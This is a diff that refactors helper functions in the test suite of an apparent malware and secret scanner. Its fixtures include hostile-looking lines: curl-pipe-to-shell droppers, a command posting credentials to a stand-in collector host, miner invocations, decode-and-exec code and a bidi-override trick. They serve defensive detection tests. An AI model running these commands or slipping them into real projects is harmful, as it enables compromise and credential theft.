@@ -27,26 +27,31 @@ THIN_MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 40
 ELF = b"\x7fELF" + b"\x00" * 40
 
 
-def flagged(root) -> set[str]:
-    return {
-        f.rule_id
-        for f in Scanner().scan(root).findings
-        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
-    }
+class ReviewDefectsHelpers:
+    """Helpers for test_review_defects.py."""
 
+    @staticmethod
+    def flagged(root) -> set[str]:
+        return {
+            f.rule_id
+            for f in Scanner().scan(root).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+        }
 
-def blocking(root) -> set[str]:
-    """The rules that would stop a build, rather than every rule that spoke.
+    @staticmethod
+    def blocking(root) -> set[str]:
+        """The rules that would stop a build, rather than every rule that spoke.
 
-    A ceiling does not remove a finding, it lowers it, so a defect about a
-    ceiling cannot be written against `flagged` -- the rule is still there and
-    is meant to be. What changed is whether it blocks.
-    """
-    return {
-        f.rule_id
-        for f in Scanner().scan(root).findings
-        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS) and f.severity >= Severity.HIGH
-    }
+        A ceiling does not remove a finding, it lowers it, so a defect about a
+        ceiling cannot be written against `flagged` -- the rule is still there and
+        is meant to be. What changed is whether it blocks.
+        """
+        return {
+            f.rule_id
+            for f in Scanner().scan(root).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+            and f.severity >= Severity.HIGH
+        }
 
 
 class TestASharedObjectIsMachOOnMacOs:
@@ -106,7 +111,7 @@ class TestATypeAnnotationAssignsNothing:
     )
     def test_end_to_end(self, tmp_path, line: str) -> None:
         (tmp_path / "a.py").write_text(f"{line}\n", encoding="utf-8")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "value", ["aB3kQ9mZ2xT7vL4nR8wY", "S3cr3tP4ssw0rdXyz9Qq", "glpat-AAAAAAAAAAAAAAAA"]
@@ -223,7 +228,7 @@ class TestAClassStatementAssignsNothing:
             "        return account\n",
             encoding="utf-8",
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_credential_in_the_same_file_still_fires(self, tmp_path) -> None:
         """The guard that makes the test above mean something. A fix that
@@ -242,7 +247,7 @@ class TestAClassStatementAssignsNothing:
             f'SESSION_TOKEN = "{value}"\n',
             encoding="utf-8",
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_detector_version_moved_with_the_behaviour(self) -> None:
         """`ScanCache.detector_signature` is `id@version`, and it is the only
@@ -305,19 +310,19 @@ class TestTRexIsAlsoADinosaur:
             'EMOJI = {\n    "t-rex": "\\U0001F996",\n    "sauropod": "\\U0001F995",\n}\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)
+        assert "SUSPECT.CRYPTOMINER.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_miner_with_its_flags_still_is(self, tmp_path) -> None:
         line = Support.assemble(
             "t-", "rex.exe -a ethash -o strat", "um+tcp://eth.pool.invalid:4444"
         )
         (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
-        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)
+        assert "SUSPECT.CRYPTOMINER.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_unambiguous_names_are_untouched(self, tmp_path) -> None:
         line = Support.assemble("xm", "rig --don", "ate-level 1")
         (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
-        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)
+        assert "SUSPECT.CRYPTOMINER.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestCargoBuildOutputIsActuallyPruned:
@@ -442,7 +447,7 @@ class TestASecurityToolsOwnSignatureFileIsNotObfuscated:
 
     def test_a_shell_signature_list_is_quiet(self, tmp_path) -> None:
         (tmp_path / "scan-malware.sh").write_text(self.SIGNATURE_FILE, encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.PACKED.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_python_signature_list_is_quiet(self, tmp_path) -> None:
         """The same file in another language. The fix is the language gate, so it
@@ -454,21 +459,21 @@ class TestASecurityToolsOwnSignatureFileIsNotObfuscated:
             "]\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.PACKED.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_real_packer_output_still_fires(self, tmp_path) -> None:
         (tmp_path / "bundle.js").write_text(
             "eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_real_identifier_obfuscation_still_fires(self, tmp_path) -> None:
         """The count threshold, from the other side. Obfuscator output is made of
         these names, so the many-occurrence case has to keep working."""
         body = "".join(f"var _0x{i:04x} = {i};\n" for i in range(1, 40))
         (tmp_path / "app.js").write_text(body, encoding="utf-8")
-        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_one_mention_in_javascript_is_not_enough(self, tmp_path) -> None:
         """A JavaScript file that documents the scheme rather than using it -- a
@@ -478,7 +483,7 @@ class TestASecurityToolsOwnSignatureFileIsNotObfuscated:
             "export const PATTERN = /_0x[0-9a-f]{4,6}/;\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.PACKED.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestALongLineInProseIsATable:
@@ -506,7 +511,7 @@ class TestALongLineInProseIsATable:
             "# Design\n\n| Module | Status | Notes |\n| --- | --- | --- |\n" + self.table_row(),
             encoding="utf-8",
         )
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_line_in_javascript_still_fires(self, tmp_path) -> None:
         """The guard that keeps the exemption about prose rather than about length.
@@ -515,7 +520,7 @@ class TestALongLineInProseIsATable:
 
         payload = _secrets.token_urlsafe(3_000)[:3_400]
         (tmp_path / "app.js").write_text(f"const x = 1;\nconst blob = '{payload}';\n", "utf-8")
-        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_prose_is_exempt_from_length_only(self, tmp_path) -> None:
         """Bidi, escapes and the packer shapes still apply to Markdown, which is
@@ -524,7 +529,7 @@ class TestALongLineInProseIsATable:
         (tmp_path / "README.md").write_text(
             f"Run this: `rm -rf {chr(0x202E)}/tmp/safe`\n", encoding="utf-8"
         )
-        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.BIDI.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestANameEndingInPathHoldsAPath:
@@ -574,7 +579,7 @@ class TestANameEndingInPathHoldsAPath:
         (tmp_path / ".env.example").write_text(
             "REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\n", encoding="utf-8"
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_real_secret_beside_it_still_fires(self, tmp_path) -> None:
         value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
@@ -582,7 +587,7 @@ class TestANameEndingInPathHoldsAPath:
             f"REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\nSECRET_KEY={value}\n",
             encoding="utf-8",
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_widening_the_path_shape_would_have_hidden_a_key(self) -> None:
         """The trade this avoided, asserted so the temptation is documented.
@@ -681,7 +686,7 @@ class TestAPrintedCommandIsNotAnExecutedOne:
             "\tgolangci-lint run -v\n",
             encoding="utf-8",
         )
-        found = flagged(tmp_path)
+        found = ReviewDefectsHelpers.flagged(tmp_path)
         assert "MALWARE.DROPPER.001" not in found
         assert "SUSPECT.DROPPER.001" not in found
 
@@ -692,7 +697,9 @@ class TestAPrintedCommandIsNotAnExecutedOne:
             "setup:\n\tcurl -sfL https://install.test/payload.sh | sh\n",
             encoding="utf-8",
         )
-        assert {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"} & flagged(tmp_path)
+        assert {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"} & ReviewDefectsHelpers.flagged(
+            tmp_path
+        )
 
 
 class TestACommentedOutSettingConfiguresNothing:
@@ -742,7 +749,7 @@ class TestACommentedOutSettingConfiguresNothing:
             '      securityContext:\n        capabilities:\n          drop: ["ALL"]\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)
+        assert "SUSPECT.K8S.CAPABILITIES.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_commented_block_is_not_a_setting(self, tmp_path) -> None:
         (tmp_path / "values.yaml").write_text(
@@ -751,7 +758,7 @@ class TestACommentedOutSettingConfiguresNothing:
             "  # readOnlyRootFilesystem: true\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)
+        assert "SUSPECT.K8S.CAPABILITIES.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_real_capability_grant_still_fires(self, tmp_path) -> None:
         (tmp_path / "pod.yaml").write_text(
@@ -759,7 +766,7 @@ class TestACommentedOutSettingConfiguresNothing:
             '      securityContext:\n        capabilities:\n          add: ["SYS_ADMIN"]\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)
+        assert "SUSPECT.K8S.CAPABILITIES.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_cap_add_stands_alone(self, tmp_path) -> None:
         """`cap_add` and `CapAdd` already say `add` in the key."""
@@ -767,7 +774,7 @@ class TestACommentedOutSettingConfiguresNothing:
             "apiVersion: ignored\nservices:\n  app:\n    cap_add:\n      - SYS_PTRACE\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)
+        assert "SUSPECT.K8S.CAPABILITIES.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestOneCredentialIsOneFinding:
@@ -926,12 +933,12 @@ class TestADoctestIsDocumentation:
         (tmp_path / "base.py").write_text(
             f'"""\nSample::\n\n    {line.format("|")}\n"""\n', encoding="utf-8"
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
         value = Support.assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
         (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAWindowsEnvironmentReferenceIsNotAValue:
@@ -1052,7 +1059,7 @@ class TestAGpgFingerprintIsNotAWalletAddress:
             "    }\n  }\n}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)
+        assert "SUSPECT.CRYPTOMINER.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_real_miner_still_fires(self, tmp_path) -> None:
         """The guard. Stratum exists for mining and nothing else, which is the
@@ -1064,7 +1071,7 @@ class TestAGpgFingerprintIsNotAWalletAddress:
         (tmp_path / "run.sh").write_text(
             f"#!/bin/sh\n./{miner} -o {pool} -u {self.address()}\n", encoding="utf-8"
         )
-        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)
+        assert "SUSPECT.CRYPTOMINER.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAnExampleOfAnAttackIsNotAnAttack:
@@ -1632,13 +1639,13 @@ class TestATrojanSourceAttackNeedsAReader:
         (tmp_path / "fixture.parquet").write_bytes(
             b"PAR1" + f"label{chr(0x202E)}value".encode() + b"\x00" * 64 + b"PAR1"
         )
-        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.BIDI.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_an_encoding_table_is_not_an_attack(self, tmp_path) -> None:
         (tmp_path / "icu_conversion_data.c.gz.afu").write_bytes(
             "".join(chr(c) for c in (0x202A, 0x202B, 0x202C, 0x202D, 0x202E)).encode()
         )
-        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.BIDI.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_source_is_still_checked(self, tmp_path) -> None:
         """The guard. A directional override in code a human reviews is the attack,
@@ -1646,7 +1653,7 @@ class TestATrojanSourceAttackNeedsAReader:
         (tmp_path / "auth.py").write_text(
             f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
         )
-        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)
+        assert "SUSPECT.OBFUSCATION.BIDI.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestDoingItCorrectlyIsNotTheSameAsDoingItCarelessly:
@@ -1888,7 +1895,7 @@ class TestAFormatNobodyListedIsStillBinary:
             b"d\x00\x04httpe\x00\x06configf\x00\x0chttp_v_1_1_0g\x00\x00\xc9\x00"
             + bytes(range(256)) * 2
         )
-        assert not {r for r in flagged(tmp_path) if r.startswith("SECRET.")}
+        assert not {r for r in ReviewDefectsHelpers.flagged(tmp_path) if r.startswith("SECRET.")}
 
 
 class TestAGoCompositeLiteralIsNotACredential:
@@ -2359,7 +2366,7 @@ class TestAGitLfsPointerIsNotAForgery:
         static.mkdir()
         for name in ("a.png", "b.pdf", "c.psd"):
             (static / name).write_bytes(self.POINTER)
-        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_skip_is_reported_once(self, tmp_path) -> None:
         from cordon_scanner import Scanner
@@ -2383,7 +2390,7 @@ class TestAGitLfsPointerIsNotAForgery:
         static = tmp_path / "static"
         static.mkdir()
         (static / "logo.png").write_bytes(b"#!/bin/sh\ncurl https://x.test/p | sh\n")
-        assert "SUSPECT.POLYGLOT.MISMATCH.001" in flagged(tmp_path)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestTwoImageFormatsConfusedIsNotADisguise:
@@ -2469,7 +2476,7 @@ class TestTwoImageFormatsConfusedIsNotADisguise:
         shots.mkdir(parents=True)
         for index in range(1, 9):
             (shots / f"{index}.jpg").write_bytes(self.PNG)
-        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAnotherAnalysersRuleCorpusIsNotAFinding:
@@ -2635,7 +2642,7 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
                 "require('https').request('https://x.test/c', {method:'POST'}).end(k);\n",
             ).encode()
         )
-        assert any(rule.startswith("MALWARE.") for rule in flagged(tmp_path))
+        assert any(rule.startswith("MALWARE.") for rule in ReviewDefectsHelpers.flagged(tmp_path))
 
     def test_a_binary_is_not_asked(self) -> None:
         """The signals are text signals. A compiled artefact cannot carry either, and
@@ -2678,7 +2685,7 @@ class TestTheMetadataEndpointIsNotTheNetwork:
         manifests = tmp_path / "terraform-manifests"
         manifests.mkdir()
         (manifests / "app1-install.sh").write_bytes(self.CLOUD_INIT)
-        assert not flagged(tmp_path)
+        assert not ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "line",
@@ -2732,7 +2739,7 @@ class TestTheMetadataEndpointIsNotTheNetwork:
                 'curl -X POST -d "$CREDS" https://collector.test/c\n',
             ).encode()
         )
-        assert flagged(tmp_path), "the outbound half is still a fetch"
+        assert ReviewDefectsHelpers.flagged(tmp_path), "the outbound half is still a fetch"
 
     @staticmethod
     def content(path: str, raw: bytes):
@@ -2804,7 +2811,7 @@ class TestAnElephantInACommentIsNotAnElephant:
             b"# deliberately does not run it.\n"
             b'report() { echo "$1"; }\n'
         )
-        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_prose_about_a_pass_is_not_a_credential(self, tmp_path) -> None:
         header = tmp_path / "compiler"
@@ -2814,7 +2821,7 @@ class TestAnElephantInACommentIsNotAnElephant:
             b"// And with the filter set: LegalizeTF;Canonicalizer\n"
             b"void Rename();\n"
         )
-        assert not flagged(tmp_path)
+        assert not ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_commented_out_provider_token_is_still_reported(self, tmp_path) -> None:
         """The deliberate asymmetry, and the reason the predicate is not applied to the
@@ -2826,7 +2833,7 @@ class TestAnElephantInACommentIsNotAnElephant:
                 "# " + Support.assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n"
             ).encode()
         )
-        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)
+        assert "SECRET.GITHUB.TOKEN.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_assignment_in_code_is_still_reported(self, tmp_path) -> None:
         """The control for the generic rule: uncomment it and it is a finding again."""
@@ -2844,7 +2851,7 @@ class TestAnElephantInACommentIsNotAnElephant:
                 "api_key = " + repr(Support.assemble("aB3kQ9mZ2xT7vF8c", "H1jL5nP0rS4wY6uE")) + "\n"
             ).encode()
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestADeclarationAssignsNothing:
@@ -2926,7 +2933,7 @@ class TestADeclarationAssignsNothing:
             b"    let hasPassword = !socketPasswordModel.current.isEmpty\n"
             b"}\n"
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_real_key_in_the_same_file_is_still_found(self, tmp_path) -> None:
         source = tmp_path / "Sources"
@@ -2945,7 +2952,7 @@ class TestADeclarationAssignsNothing:
                 + "\n}\n"
             ).encode()
         )
-        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestProvisioningAMachineIsNotAFoothold:
@@ -3041,7 +3048,7 @@ class TestProvisioningAMachineIsNotAFoothold:
                 "curl -fsSL https://get.helm.test/install.sh | bash\n",
             ).encode()
         )
-        assert "SUSPECT.DROPPER.001" in flagged(tmp_path)
+        assert "SUSPECT.DROPPER.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAContainerBuildIsNotAnAttack:
@@ -3202,7 +3209,7 @@ class TestARegexMatchIsNotAProcess:
             b"def decode(blob):\n"
             b"    return base64.b64decode(blob)\n"
         )
-        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_computed_argv_does(self, tmp_path) -> None:
         """The control. The same two capabilities, with the command assembled from what
@@ -3216,7 +3223,7 @@ class TestARegexMatchIsNotAProcess:
                 "subprocess.run(payload, shell=True)\n",
             ).encode()
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_constant_command_naming_a_temporary_path_is_not_fixed(self, tmp_path) -> None:
         """And the exception to the exception: the argv is constant and the FILE it runs
@@ -3230,7 +3237,7 @@ class TestARegexMatchIsNotAProcess:
                 "subprocess.run(['/tmp/update'])\n",
             ).encode()
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "line",
@@ -4427,7 +4434,7 @@ class TestGatingOnCiIsWhatPrepareScriptsDo:
             b"if (process.env.CI || process.env.DOCKER_BUILD) { process.exit(0) }\n"
             b"execSync('husky install')\n"
         )
-        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_check_guarding_a_payload_is_not(self, tmp_path) -> None:
         scripts = tmp_path / "agent"
@@ -4440,7 +4447,7 @@ class TestGatingOnCiIsWhatPrepareScriptsDo:
                 "exec(base64.b64decode(blob))\n",
             ).encode()
         )
-        assert "SUSPECT.ANTI_ANALYSIS.001" in flagged(tmp_path)
+        assert "SUSPECT.ANTI_ANALYSIS.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_write_into_globals_is_not_dispatch(self) -> None:
         from cordon_scanner.detect.pyast import PythonAnalyzer
@@ -4493,7 +4500,7 @@ class TestACiScriptIsNotADropper:
             b"wget https://huggingface.test/datasets/x/resolve/main/data.json\n"
             b"timeout 600 bash -c 'until curl localhost:8000/v1/models; do sleep 1; done'\n"
         )
-        assert "MALWARE.DROPPER.001" not in flagged(tmp_path)
+        assert "MALWARE.DROPPER.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_ci_script_that_pipes_a_fetch_into_a_shell(self, tmp_path) -> None:
         """The control, and the shape the branch exists for."""
@@ -4502,7 +4509,7 @@ class TestACiScriptIsNotADropper:
         (flow / "upload.sh").write_bytes(
             Support.assemble("#!/bin/bash\n", "curl -s https://codecov.test/bash | bash\n").encode()
         )
-        assert "MALWARE.DROPPER.001" in flagged(tmp_path)
+        assert "MALWARE.DROPPER.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         ("line", "probe"),
@@ -4794,7 +4801,7 @@ class TestDefiningANameIsNotUsingIt:
             b"on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n"
             b"      - run: echo ${{ github.event.pull_request.user.login }} > ./pr/author\n"
         )
-        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in flagged(tmp_path)
+        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_title_still_can(self, tmp_path) -> None:
         flow = tmp_path / ".github" / "workflows"
@@ -4803,7 +4810,7 @@ class TestDefiningANameIsNotUsingIt:
             b"on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n"
             b"      - run: echo ${{ github.event.pull_request.title }} > ./pr/title\n"
         )
-        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in flagged(tmp_path)
+        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestOneDecisionAppliedSixHundredTimes:
@@ -7534,7 +7541,7 @@ class TestARustTestModuleIsNotACapability:
         (tmp_path / "Cargo.toml").write_text('[workspace]\nmembers = ["crates/protocol"]\n')
         (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
         (crate / "src" / "fleet.rs").write_text(self.FIXTURE)
-        assert "SUSPECT.EXFIL.DROP_POINT.001" not in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_pair_outside_the_module_still_is(self, tmp_path) -> None:
         """The control. Nothing changed but the four lines that put it in the tests."""
@@ -7548,7 +7555,7 @@ class TestARustTestModuleIsNotACapability:
             "    post(hook, identity);\n"
             "}\n"
         )
-        assert "SUSPECT.EXFIL.DROP_POINT.001" in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestAHostIsNotASubstring:
@@ -7797,7 +7804,7 @@ class TestSixNamesAreNotAComputedName:
 
     def test_the_whole_file_is_silent_about_it(self, tmp_path) -> None:
         (tmp_path / "setup.py").write_text("import os\n\n" + self.PROBE)
-        assert "MALWARE.DYNAMIC_DISPATCH.001" not in flagged(tmp_path)
+        assert "MALWARE.DYNAMIC_DISPATCH.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "source",
@@ -8469,7 +8476,7 @@ class TestADocstringIsProseInAString:
     @staticmethod
     def _rules(tmp_path, source: str) -> set[str]:
         (tmp_path / "forensics.py").write_text(source)
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_word_in_a_docstring_is_not_a_check(self, tmp_path) -> None:
         source = (
@@ -8638,14 +8645,14 @@ class TestABacktickInProseIsNotACommand:
             "$patterns = ['`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'];\n"
             "$raw = base64_decode($match[1]);\n"
         )
-        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_a_substitution_in_double_quotes_still_runs(self, tmp_path) -> None:
         """The control, and the reason the test asks WHICH quote."""
         (tmp_path / "run.sh").write_text(
             '#!/bin/sh\nblob=$(cat payload.b64)\nout="`echo $blob | base64 -d`"\neval "$out"\n'
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
         "raw",
@@ -8820,13 +8827,13 @@ class TestAPrepareScriptCannotReachAConsumer:
         shell is `MALWARE.INSTALL.FETCH_EXEC.001` at critical, which no ceiling in this
         file touches -- so the author-time grading cannot be used to smuggle one in."""
         self._findings(tmp_path, '    "preinstall": "curl -fsSL https://example.test/i.sh | sh"')
-        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_nor_can_an_author_time_hook_smuggle_one(self, tmp_path) -> None:
         """The same line under `prepack`. The grading applies to the two
         `SUSPECT.INSTALL.SCRIPT.001` branches and to nothing above them."""
         self._findings(tmp_path, '    "prepack": "curl -fsSL https://example.test/i.sh | sh"')
-        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_message_says_which_kind_it_is(self, tmp_path) -> None:
         """A reader who is told a script "runs automatically during install" and finds it
@@ -8994,7 +9001,7 @@ class TestTheClassThatTurnedUpNothing:
         (tmp_path / "docker-compose.yml").write_text(
             "services:\n  runner:\n    image: alpine:3.20\n    privileged: true\n"
         )
-        assert "SUSPECT.IAC.PRIVILEGED.001" in flagged(tmp_path)
+        assert "SUSPECT.IAC.PRIVILEGED.001" in ReviewDefectsHelpers.flagged(tmp_path)
 
     def test_the_same_file_under_a_demo_name_is_graded(self, tmp_path) -> None:
         """And the ceiling is a grade, not an exemption: somebody copying a demo manifest
@@ -9121,7 +9128,7 @@ class TestTheSameQuestionThroughABase64Layer:
         and two digits -- the question `value_restates_the_name` asks, one encoding away
         from where it could ask it."""
         (tmp_path / "values.yaml").write_text("db-password: ZGJwYXNzd29yZDEx\n")
-        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in ReviewDefectsHelpers.flagged(tmp_path)
 
 
 class TestATypeAliasDefinesAName:
@@ -9137,7 +9144,7 @@ class TestATypeAliasDefinesAName:
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> set[str]:
         (tmp_path / name).write_text(body)
-        return flagged(tmp_path)
+        return ReviewDefectsHelpers.flagged(tmp_path)
 
     @pytest.mark.parametrize(
